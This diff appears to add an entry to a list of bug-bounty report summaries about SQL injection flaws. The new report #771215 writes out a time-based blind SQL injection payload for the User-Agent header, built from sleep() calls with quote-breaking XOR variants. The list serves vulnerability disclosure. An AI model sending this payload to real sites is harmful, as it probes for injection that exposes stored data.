@@ -39,3 +39,7 @@ the site is vulnerable to SQL injection in the maxlength attribute of the SSN in
 ## report #838855
 this site have Blind SQL Injection by Abusing LocalParams (res_id) in /php/geto2banner <br>
  we are able to Exploit it to extract data from your DB
+
+## report #771215
+Blind Sql injection Vulnerability in User-Agent <br>
+put this payload in user agent parameter if(now()=sysdate(),sleep(10),0)/*'XOR(if(now()=sysdate(),sleep(10),0))OR'"XOR(if(now()=sysdate(),sleep(10),0))OR"*/ 
